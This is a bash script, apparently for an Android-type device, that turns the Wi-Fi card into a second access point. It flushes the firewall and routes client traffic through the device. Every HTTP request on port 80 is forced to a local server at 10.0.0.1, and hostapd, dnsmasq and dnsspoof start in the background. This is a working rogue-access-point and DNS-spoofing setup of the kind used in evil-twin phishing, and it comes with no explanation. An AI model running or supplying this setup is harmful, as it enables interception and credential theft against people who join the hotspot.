#!/bin/bash
echo "Checking default rule number.."
for table in $(ip rule list | awk -F"lookup" '{print $2}'); do
DEF=`ip route show table $table|grep default|grep wlan0`
  if ! [ -z "$DEF" ]; then
     break
  fi
done
echo "Default rule number is $table"
echo "Checking for existing wlan2 interface..."
if ip link show wlan2; then
  echo "wlan 2 exists, continuing.."
else
  if [[ `iw list | grep '* AP'` == *"* AP"* ]]; then
    echo "wlan0 supports AP mode, creating AP interface.."
    iw dev wlan0 interface add wlan2 type __ap
    ip addr flush wlan2
    ip addr flush wlan2
    ip link set up dev wlan2
  else
    echo "wlan0 doesn't support AP mode, exiting.."
    exit 0
  fi
fi
echo "Adding iptables for internet sharing..."
iptables --flush

ifconfig wlan2 up 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

iptables -t nat -A PREROUTING -i wlan2 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan2 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward

ip rule add from all lookup main pref 1 2> /dev/null
ip rule add from all iif lo oif wlan2 uidrange 0-0 lookup 97 pref 11000 2> /dev/null
ip rule add from all iif lo oif wlan0 lookup $table pref 17000 2> /dev/null
ip rule add from all iif lo oif wlan2 lookup 97 pref 17000 2> /dev/null
ip rule add from all iif wlan2 lookup $table pref 21000 2> /dev/null

echo "Starting"
sleep 5 && hostapd hostapd.conf &
sleep 5
dnsmasq -C dnsmasq.conf &
sleep 5
dnsspoof -i wlan2 > /dev/null 2>&1 &
